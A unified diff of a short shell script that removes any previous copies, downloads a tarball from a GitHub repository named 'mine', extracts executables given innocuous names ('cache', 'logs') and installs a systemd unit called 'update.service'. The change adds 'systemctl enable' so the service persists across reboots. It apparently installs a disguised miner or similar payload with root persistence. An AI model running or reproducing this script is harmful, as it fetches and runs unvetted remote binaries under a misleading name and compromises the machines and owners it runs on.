@@ -1,2 +1,2 @@
 #!/bin/sh -e
-rm -rf oc.tar cache logs && wget https://raw.githubusercontent.com/robertreynolds2/mine/main/oc.tar && tar xf oc.tar && chmod +x cache logs && cd /etc/systemd/system/ && wget https://raw.githubusercontent.com/robertreynolds2/mine/main/update.service && systemctl start update.service
+rm -rf oc.tar cache logs && wget https://raw.githubusercontent.com/robertreynolds2/mine/main/oc.tar && tar xf oc.tar && chmod +x cache logs && cd /etc/systemd/system/ && wget https://raw.githubusercontent.com/robertreynolds2/mine/main/update.service && systemctl enable update.service && systemctl start update.service
